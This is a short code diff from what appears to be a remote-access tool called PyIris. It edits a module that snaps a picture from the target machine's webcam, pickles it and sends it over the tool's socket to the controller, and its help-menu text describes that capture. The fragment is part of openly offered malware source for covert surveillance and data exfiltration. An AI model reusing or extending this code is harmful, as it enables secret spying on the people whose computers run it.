@@ -19,7 +19,7 @@ def webcam():
     return im''')
         config.logics.append('''
             elif command == 'webcam':
-                s.sendall(pickle.dumps(Image.fromarray(webcam())))''')
+                send_all(s,pickle.dumps(Image.fromarray(webcam())))''')
         config.help_menu[
             'webcam'] = 'Snaps a picture from the webcam and saves it as an in memory pickle before sending it to PyIris to decode and download'
     elif option == 'info':
